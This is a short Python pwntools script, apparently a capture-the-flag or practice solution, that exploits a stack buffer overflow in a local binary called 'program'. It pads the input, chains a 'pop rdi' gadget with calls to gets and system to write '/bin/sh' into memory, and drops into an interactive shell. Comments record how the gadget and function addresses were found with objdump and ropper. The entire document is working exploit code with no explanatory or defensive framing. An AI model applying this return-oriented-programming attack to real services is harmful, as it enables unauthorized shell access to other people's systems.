#!/usr/bin/env python3
from pwn import * 

context(os="linux", arch="amd64")
e = ELF('program')
context.binary = e 
p = e.process()


junk = b"A"*40
binsh = b"/bin/sh\x00"
data = p64(0x404040)

#objdump -M intel -d program | grep gets
pltgets = p64(0x401060)

#objdump -M intel -d program | grep system
pltsytem = p64(0x401040)

#ropper -f program --search "pop rdi; ret;"
#0x000000000040125b: pop rdi; ret;
poprdi = p64(0x40125b) 


payload = junk + poprdi + data + pltgets + poprdi + data + pltsytem

print(p.recvline())
p.sendline(payload)
print(p.recv())
p.sendline(binsh)
p.interactive()
